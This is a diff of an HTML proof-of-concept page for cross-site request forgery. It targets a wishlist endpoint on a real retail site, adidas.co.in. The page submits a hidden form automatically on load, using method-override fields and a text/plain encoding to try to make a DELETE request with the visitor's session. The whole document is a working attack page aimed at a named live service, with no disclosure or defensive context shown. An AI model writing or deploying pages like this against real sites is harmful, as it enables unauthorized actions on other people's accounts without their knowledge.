@@ -1,21 +1,14 @@
 <!doctype html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title>CSRF PoC — method override</title>
-  </head>
+  <head><meta charset="utf-8"><title>CSRF PoC — text/plain</title></head>
   <body onload="document.forms[0].submit()">
-    <form action="https://www.adidas.co.in/gw/wsh/wishlists/9ca84ea3-c265-4752-9697-f8558a1dcf0b/products/KD8363" method="post">
-      <!-- common names used by frameworks -->
+    <form action="https://www.adidas.co.in/gw/wsh/wishlists/9ca84ea3-c265-4752-9697-f8558a1dcf0b/products/KD8363"
+          method="post"
+          enctype="text/plain">
+      <!-- try to send a raw {} value inside a field; server may parse loosely -->
+      <input type="hidden" name="__raw" value="{}">
       <input type="hidden" name="_method" value="DELETE">
-      <!-- alternate header-style override (server may accept as param) -->
-      <input type="hidden" name="X-HTTP-Method-Override" value="DELETE">
-      <!-- include "body" placeholder; server-specific -->
-      <input type="hidden" name="payload" value="{}">
-      <noscript>
-        <p>Javascript disabled — click the button to submit the PoC.</p>
-        <button type="submit">Submit</button>
-      </noscript>
+      <noscript><button type="submit">Submit</button></noscript>
     </form>
   </body>
 </html>
